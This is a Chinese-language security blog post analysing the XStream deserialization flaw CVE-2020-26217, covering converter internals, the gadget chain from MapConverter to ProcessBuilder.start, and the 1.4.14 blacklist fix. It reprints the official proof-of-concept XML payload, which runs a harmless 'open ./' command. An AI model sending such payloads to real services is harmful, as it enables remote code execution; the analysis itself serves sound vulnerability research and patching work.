> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NgzWHB_NhoBseVNgUdgmSA)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiavGqtJYKfALwXc7NGSBGiaNgc7ZOTUkesf3B4egHYmMCgiahtL1ia2p83Q/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvyyjt1GfHLaqE7wPAcicNCKgOmHHy9U3mdC6sqcXpSZMtt7NQOLxzJxA/640?wx_fmt=png)

引言

近期，XStream 发布了关于 CVE-2020-26217 的公告，通过该漏洞攻击者可发送恶意构造的 xml，在受影响版本 (<=1.4.13) 的 XStream 上直接 RCE。

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvyyjt1GfHLaqE7wPAcicNCKgOmHHy9U3mdC6sqcXpSZMtt7NQOLxzJxA/640?wx_fmt=png)

XStream 反序列化原理

与传统的 Java 反序列化不同，XStream 反序列化的触发不依靠 readObject，而是使用 Converter(转换器) 中的 unmarshal。而 Converter 根据源码的注释，其用途为对象与 xml 文本之间的相互转换。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaIvCkNTJu6IyvZ53X1LLlfZXic40f53ncSRrv2I33bIVkn1zk2Y4OWYw/640?wx_fmt=png)

下面用一个简单的例子来演示，首先我们定义一个 User 类

```
public class User {
    public String username;
}

```

然后使用 XStream 加载

```
XStream xStream = new XStream();
User user = (User)xStream.fromXML(new File("/Users/dinfinite/IdeaProjects/xstream/src/main/resources/payloads/user.xml"));

```

由于 User 类并未在 Converter 的转换类型中，因此使用 ReflectionConverter 进行 unmarshal，该转换器判断能否转换的逻辑如下，即类存在且可访问

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiar7qO0xwiaqI4TO3PTRmD4wQorI6tqMwyHJctfvUP4Or1qJlyHEvzPzw/640?wx_fmt=png)

调用 unmarshal 将 xml 还原为 User 对象，完成反序列化的过程

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaibsmaFLjusJA2FiaE5s1q7JRiaaV10IHSL8mxiaVzYAk1GV50cS6PEKeWg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvyyjt1GfHLaqE7wPAcicNCKgOmHHy9U3mdC6sqcXpSZMtt7NQOLxzJxA/640?wx_fmt=png)

XStream 历史漏洞

在 XStream 过往的漏洞中，利用的核心为 DynamicProxy 类和 EventHandler 类，当存在 dynamic-proxy 标签时，会使用 DynamicProxyConverter 进行 unmarshal，该操作会构造一个由用户指定 handler 的对应代理对象。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaQZuIBT8ictK2iaPBvs5sGcTic9VOr5tIFN9gCSEcqvPmGD7hzquA5qLLw/640?wx_fmt=png)

而恰好 EventHandler 的 invoke 函数支持执行任意方法 (根据传入的参数)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaA0PMo0lNsc96X5ic5W0RaDvbOzbzHlibn7CsHAHYWLjmMtuPib4Mw4icFQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiadiaGUTVYQAMTcbD3lLYZGOib4XRVLBgLrbQDR4I7M9Yc3qicyzB115eBw/640?wx_fmt=png)

因此 XStream 官方的修复方式为, 实现了一个类为 InternalBlackList(黑名单转换器), 当属性值为 java.beans.EventHandler 时，抛出异常，因此基于该类型的 poc 均失效

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaMyXdhMHEqQ6Oh6NWYfuiac0cVGhNvXicWJB5k5hcUtO7fRuCErh645qA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvyyjt1GfHLaqE7wPAcicNCKgOmHHy9U3mdC6sqcXpSZMtt7NQOLxzJxA/640?wx_fmt=png)

漏洞复现

以下为官方公告中给出的 POC

```
<map>
    <entry>
        <jdk.nashorn.internal.objects.NativeString>
            <flags>0</flags>
            <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
                <dataHandler>
                    <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
                        <contentType>text/plain</contentType>
                        <is class='java.io.SequenceInputStream'>
                            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
                                <iterator class='javax.imageio.spi.FilterIterator'>
                                    <iter class='java.util.ArrayList$Itr'>
                                        <cursor>0</cursor>
                                        <lastRet>-1</lastRet>
                                        <expectedModCount>1</expectedModCount>
                                        <outer-class>
                                            <java.lang.ProcessBuilder>
                                                <command>
                                                    <string>open</string>
                                                    <string>./</string>
                                                </command>
                                            </java.lang.ProcessBuilder>
                                        </outer-class>
                                    </iter>
                                    <filter class='javax.imageio.ImageIO$ContainsFilter'>
                                        <method>
                                            <class>java.lang.ProcessBuilder</class>
                                            <name>start</name>
                                            <parameter-types/>
                                        </method>
                                        <name>start</name>
                                    </filter>
                                    <next/>
                                </iterator>
                                <type>KEYS</type>
                            </e>
                            <in class='java.io.ByteArrayInputStream'>
                                <buf></buf>
                                <pos>0</pos>
                                <mark>0</mark>
                                <count>0</count>
                            </in>
                        </is>
                        <consumed>false</consumed>
                    </dataSource>
                    <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
            </value>
        </jdk.nashorn.internal.objects.NativeString>
        <string>test</string>
    </entry>
</map>

```

通过 XStream 加载上述 XML，成功弹出计算器

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaf6ZatLUyCobYenkdiafTZrsbTJtfof4nn7s9Yv39KHu7UTNib9RQOXsw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvyyjt1GfHLaqE7wPAcicNCKgOmHHy9U3mdC6sqcXpSZMtt7NQOLxzJxA/640?wx_fmt=png)

漏洞分析

由于该漏洞触发链较长，为了便于理解，将整体的利用链分成四部分。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaAkJGX4krQN6jVF0078wsAP4IA1Wv9ib0Q2npyVKBIdxoIVIl4LGuLlg/640?wx_fmt=png)

### **入口**

由于 DynamicProxy 类和 EventHandler 类的组合拳失效，因此这次漏洞并没有利用动态代理转换器，漏洞的触发点在 MapConverter 中，其 unmarshal 函数如下

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaGLAjhibfM2OK470X4ZErMhdfanLCOJF8uZQaE734Xmok1IY3UKrNspg/640?wx_fmt=png)

可以看到，传入的 XML 文本 (转换为 reader)，被传递到了填充 map 的函数中，进一步跟进，流程走到了 putCurrentEntryIntoMap 函数中，该函数的作用为将对应的 key 和 value(从 XML 中解析，对应 POC 中的 < jdk.nashorn.internal.objects.NativeString > 和 < string>) 放到 HashMap 中，由此触发 HashMap 的 put 方法，进入纽带 1 阶段

### **纽带 1**

由于在 Java 中 HashMap 需要计算 HashCode，因此作为 key 的 jdk.nashorn.internal.objects.NativeString，会调用其 hashCode 方法

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaqGpd9oeyM0A89iaCoeeE5YYajkrR7SMjDoLZRpn1DdxvibN4Z9iawVlzg/640?wx_fmt=png)

### **纽带 2**

由于 jdk.nashorn.internal.objects.NativeString 的 hashCode 会先调用 getStringValue()，它调用当前类的属性 value 的 toString 方法, 由于 value 为 com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data 类，它的 toString 会触发自身的 get 函数

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaLYOOVmnNwqgRK48TBV79hn5CqB1ibaIpAdZibzEstOmKxw7EdxsTDbtw/640?wx_fmt=png)

get 函数调用 readForm 读取自身的 DataSource 中的 InputStream

### **终点方法**

在读取的过程中，会遍历 InputStream 中的子元素

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaO3alpCRA8CRAEZPvcTabA7PNJPHxwKu2jGcu3DAz68rnqiadyuXJ08g/640?wx_fmt=png)

而 javax.swing.MultiUIDefaultsEnumerator 类的 nextElement，会调用自身迭代器的 next 函数，其 next 函数中额外调用了 advance 函数

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiauK47AibfsOB1YkCSLFOKxLpk6hc2O2M3ibiaYybMk8Dbhh3gyOATkbuaw/640?wx_fmt=png)

advance 函数额外调用了 filter 属性的 filter 方法

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaxekS0o8AxN1a0aicEJraHOsLJ2SIFYQdxLichXnezxK7b9uPaMu3rreA/640?wx_fmt=png)

javax.imageio.ContainsFilter 类的 filter 方法如下

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaVchYsoGIHJwblXk2icnWXS2E9xzvW1rGTMoqLR9SpNia8ggia07m8n3lQ/640?wx_fmt=png)

可以看到，只要 method 以及 elt 可控，即可执行任意类任意方法，实现 RCE。而 method 和 elt 在先前的 ReflectionConverter 中，已经填充完毕，对应 POC 中的 <filter> 和 < iter > 元素。

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvyyjt1GfHLaqE7wPAcicNCKgOmHHy9U3mdC6sqcXpSZMtt7NQOLxzJxA/640?wx_fmt=png)

漏洞修复

其实官方早在 1.4.7 的时候，就加入了针对 XStream 自身的安全框架

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaNyqr7JZhB5D5sH07aYsfIXQ3hdTlSfNGoTuI2LKNaPJe5ASpn1oJow/640?wx_fmt=png)

然而框架本身并未提供任何默认策略，需要用户手动调用 addPermission 进行配置，因此，在 1.4.13 之前的版本，其防御手段都是依靠修改 Converter，包括 InternalBlackList 和 ReflectionConverter，在转换时将其拦截。在 1.4.13 中，默认加入了 EventHandler 的黑名单

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaxI16FKWfyWCfb7kFwT4mf9EPQZjSWOFp4M4RPypg6vibMKCqibGEWJVA/640?wx_fmt=png)

在 1.4.14 中，加入了 java.lang.ProcessBuilder 和 javax.imageio.ImageIO$ContainsFilter 的黑名单

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaPUARpCxBoJYPksjb5RakFfxG3uajPZzYaNGSusXQfxw69NtFLCF8Cw/640?wx_fmt=png)

当我们在 1.4.14 中再次执行 POC 时，会发现抛出了 ForbiddenClassException 异常。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaWGJNd5avWn7jicP1j4TmYVHKjUpDPqA7YmCXR38GPG6Dy6CEicKMIibLA/640?wx_fmt=png)

跟踪其调用栈，发现 SecurityMapper 会存取到 Converter 当中，当 Converter 试图获取标签的类时，会先遍历自身的 Mapper(其中包括 SecurityMapper)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaSEOy3VroVFowEB2dzTjRkTxNBG0CiaKHSFepBN8YQAIRJia8evWaiaDLw/640?wx_fmt=png)

此时假设匹配到黑名单类，直接抛出异常。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaAWTRKT4cBgxjYrGNbpviaQZ1YWKBymhPUFrbm1TZkkddsmUwiaF15wSg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7Fmh2adUW4f2jMldibCAfYiaHascYFavQPEhnJU2CFYhRfRlSYCEgIeP2XFiaWM0l63FZBpKVBXIszw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvyyjt1GfHLaqE7wPAcicNCKgOmHHy9U3mdC6sqcXpSZMtt7NQOLxzJxA/640?wx_fmt=png)

参考链接

Java XStream 反序列化漏洞

（点击 “阅读原文” 查看链接）  

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb5ZMeq0JBK8AOH3CVMApDrPvnibHjxDDT1mY2ic8ABv6zWUDq0VxcQ128rL7lxiaQrE1oTmjqInO89xA/640?wx_fmt=gif)  

------------------------------------------------------------------------------------------------------------------------------------------------

**戳 “阅读原文” 查看更多内容**